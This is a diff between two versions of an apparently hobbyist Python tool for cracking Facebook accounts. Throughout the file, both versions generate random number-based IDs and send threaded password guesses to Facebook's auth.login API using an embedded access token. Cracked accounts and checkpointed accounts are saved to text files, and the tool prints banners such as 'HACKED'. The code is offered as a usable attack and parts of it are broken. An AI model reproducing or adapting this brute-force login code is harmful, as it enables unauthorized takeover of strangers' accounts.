@@ -1,25 +1,17 @@
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-# Made With ❤️ uj
+# uncompyle6 version 3.8.0
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.
 
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, http.cookiejar, requests, mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-from importlib import reload
-reload(sys)
-sys.getdefaultencoding()
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+# Embedded file name: /data/data/com.termux/files/home/D39.py
+# Compiled at: 2021-12-25 19:30:37
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
-
 for n in range(30000):
     nmbr = random.randint(111111, 999999)
     sys.stdout = open('.txt', 'a')
-    print (nmbr)
+    print nmbr
     sys.stdout.flush()
 
 try:
@@ -32,30 +24,24 @@ try:
 except ImportError:
     os.system('pip2 install request')
     time.sleep(1)
-    os.system('Then type: python testing.py')
+    os.system('Then type: python2 D39.py')
 
-
-##logo
-_logo_line_1_ = ('\x1b[1;91m___   ___ ___ ___ _______ _______')
-_logo_line_2_ = ('\x1b[1;91m| |   | | | | | | |  ___| |_   _|')
-_logo_line_3_ = ('\x1b[1;92m| |___| | | | | | | |___    | |  ')
-_logo_line_4_ = ('\x1b[1;92m|  ___  | | | | | |___  |   | |  ')
-_logo_line_5_ = ('\x1b[1;91m| |   | | | |_| | ____| |  _| |  ')
-_logo_line_6_ = ('\x1b[1;91m|_|   |_| |_____| |_____| |___|  ')
-_logo_line_7_ = ('\x1b[1;97m-------------------------------------------------')
-def _my_logo_():
-    print(_logo_line_1_)
-    print(_logo_line_2_)
-    print(_logo_line_3_)
-    print(_logo_line_4_)
-    print(_logo_line_5_)
-    print(_logo_line_6_)
-    print(_logo_line_7_+'\n')
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def acak(b):
     w = 'ahtdzjc'
     d = ''
-    for i in w:
+    for i in x:
         d += '!' + w[random.randint(0, len(w) - 1)] + i
 
     return cetak(d)
@@ -83,7 +69,7 @@ def tik():
     titik = [
      '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
     for o in titik:
-        print ('\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mUJ OLD TOOL Loa\x1b[1;90mding \x1b[1;97m' + o,)
+        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mD3M09 TOOL Loa\x1b[1;90mding \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(0.5)
 
@@ -95,22 +81,25 @@ cpb = []
 vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 os.system('clear')
-_my_logo_()
-CorrectUsername = 'UnicUJ'
-CorrectPassword = 'Tanasha'
+logo1 = '\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n--------------------------------------------------\n\x1b[1;97m'
+print logo1
+CorrectUsername = 'D3M09'
+CorrectPassword = 'BCZ'
 loop = 'true'
 while loop == 'true':
-    username = input('\x1b[1;92m \x1b[1;92mTool Username \x1b[1;92m:\x1b[1;92m ')
+    username = raw_input('\x1b[1;92m \x1b[1;92mTool Username \x1b[1;92m:\x1b[1;92m ')
     if username == CorrectUsername:
-        password = input('\x1b[1;92m \x1b[1;92mTool Password \x1b[1;92m:\x1b[1;92m ')
+        password = raw_input('\x1b[1;92m \x1b[1;92mTool Password \x1b[1;92m:\x1b[1;92m ')
         if password == CorrectPassword:
-            print ('Login Successfull as uj')
+            print 'Login Successfull as D3M09'
             time.sleep(1)
             loop = 'false'
         else:
-            print ('\x1b[1;92mWrong Password')
+            print '\x1b[1;92mWrong Password'
+            os.system('xdg-open https://www.facebook.com/Itz.D3M0N')
     else:
-        print ('\x1b[1;92mWrong Username')
+        print '\x1b[1;92mWrong Username'
+        os.system('xdg-open  https://www.facebook.com/Itz.D3M0N')
 
 def lisensi():
     os.system('clear')
@@ -119,70 +108,78 @@ def lisensi():
 
 def login():
     os.system('clear')
-    _my_logo_()
-    print ('\x1b[1;92m(1) START CLONING [2008]')
-    print ('\x1b[1;92m(1) START CLONING [2009]')
-    print ('\x1b[1;97m(0) Back')
+    print logo1
+    print
+    print '\x1b[1;92m(1) START TESTING [2008]'
+    print '\x1b[1;97m(0) Back'
     pilih_Somi()
 
 
 def pilih_Somi():
-    Somi = input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
+    Somi = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
     if Somi == '':
-        print ('\x1b[1;97mFill In Correctly')
-        login()
+        print '\x1b[1;97mFill In Correctly'
+        pilih_login()
     elif Somi == '1':
         p()
     elif Somi == '2':
         b()
+    elif Somi == '3':
+        os.system('clear')
+        print '\n \n \n This One Is Paid'
+    elif Somi == '4':
+        os.system('clear')
+        print '\n \n \n This One Is Paid'
+    elif Somi == 'Help, help':
+        os.system('xdg-open  https://www.facebook.com/Itz.D3M0N')
     else:
-        print ('Fill In Correctly')
+        print 'Fill In Correctly'
 
 
 def p():
     os.system('clear')
-    _my_logo_()
+    print logo1
     print
     print
-    print ('Do you want countinue [y/n]')
+    print 'Do you want countinue [y/n]'
     act()
 
 
 def act():
-    somi = input('\n\n \x1b[1;97m  ')
+    somi = raw_input('\n\n \x1b[1;97m  ')
     if somi == '':
-        print ('[!] Fill in correctly')
+        print '[!] Fill in correctly'
         act()
     elif somi == 'y':
         tik()
         os.system('clear')
-        _my_logo_()
+        print logo1
         print
-        print ('\x1b[1;93mTYPE ANY TWO CODE')
-        print ('\n')
+        print '\x1b[1;93mTYPE ANY TWO CODE'
+        print '\n'
         print
         try:
-            c = input('>>> ')
+            c = raw_input('>>> ')
             k = '51'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print ('[!] File Not Found')
-            input('\n[ Back ]')
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
             somi()
 
     elif somi == 'n':
         login()
     else:
-        print ('[!] Fill In Correctly')
+        print '[!] Fill In Correctly'
         action()
-    print (47 * '\x1b[1;93m-')
+    print 47 * '\x1b[1;93m-'
     xxx = str(len(id))
     jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
     jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
-    print (47 * '\x1b[1;93m-')
+    print 47 * '\x1b[1;93m-'
 
     def main(arg):
         global cpb
@@ -198,13 +195,13 @@ def act():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1)
+                print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                 okb = open('sdcard/ids/successful.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1)
+                print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                 cps = open('sdcard/ids/checkpoint.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -214,13 +211,13 @@ def act():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2)
+                    print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                     okb = open('sdcard/ids/successful.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2)
+                    print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                     cps = open('sdcard/ids/checkpoint.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -230,13 +227,13 @@ def act():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3)
+                        print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                         okb = open('sdcard/ids/successful.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3)
+                        print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                         cps = open('sdcard/ids/checkpoint.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
@@ -246,53 +243,53 @@ def act():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print (50 * '\x1b[1;91m-')
-    print ('Process Has Been Completed ...')
-    input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    print 50 * '\x1b[1;91m-'
+    print 'Process Has Been Completed ...'
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
     login()
 
 
 def b():
     os.system('clear')
-    _my_logo_()
+    print logo1
     print
     print
-    print ('Do you want countinue [y/n]')
+    print 'Do you want countinue [y/n]'
     action()
 
 
 def action():
-    somi = input('\n\n \x1b[1;97m  ')
+    somi = raw_input('\n\n \x1b[1;97m  ')
     if somi == '':
-        print ('[!] Fill in correctly')
+        print '[!] Fill in correctly'
         action()
     elif somi == 'y':
         tik()
         os.system('clear')
-        _my_logo_()
+        print logo1
         print
         try:
-            c = input('TYPE ANY 1 DIGIT NUMBER >>>')
+            c = raw_input('TYPE ANY 1 DIGIT NUMBER >>>')
             k = '1000000'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print ('[!] File Not Found')
-            input('\n[ Back ]')
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
             somi()
 
     elif somi == 'n':
         login()
     else:
-        print ('[!] Fill In Correctly')
+        print '[!] Fill In Correctly'
         action()
-    print (47 * '\x1b[1;93m-')
+    print 47 * '\x1b[1;93m-'
     xxx = str(len(id))
     jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
     jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
-    print (47 * '\x1b[1;93m-')
+    print 47 * '\x1b[1;93m-'
 
     def main(arg):
         user = arg
@@ -306,13 +303,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1)
+                print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                 okb = open('sdcard/ids/successful.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1)
+                print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                 cps = open('sdcard/ids/checkpoint.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -322,13 +319,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2)
+                    print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                     okb = open('sdcard/ids/successful.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print ('\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2)
+                    print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                     cps = open('sdcard/ids/checkpoint.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -338,13 +335,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3)
+                        print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                         okb = open('sdcard/ids/successful.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3)
+                        print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                         cps = open('sdcard/ids/checkpoint.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
@@ -354,13 +351,13 @@ def action():
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print ('\x1b[1;93m   (UJ-HACK\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4)
+                            print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
                             okb = open('sdcard/ids/successful.txt', 'a')
                             okb.write(k + c + user + pass4 + '\n')
                             okb.close()
                             oks.append(c + user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print ('\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4)
+                            print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
                             cps = open('sdcard/ids/checkpoint.txt', 'a')
                             cps.write(k + c + user + pass4 + '\n')
                             cps.close()
@@ -370,10 +367,10 @@ def action():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print (50 * '\x1b[1;91m-')
-    print ('Process Has Been Completed ...')
-    print ('Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb)))
-    input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    print 50 * '\x1b[1;91m-'
+    print 'Process Has Been Completed ...'
+    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
     login()
 
 
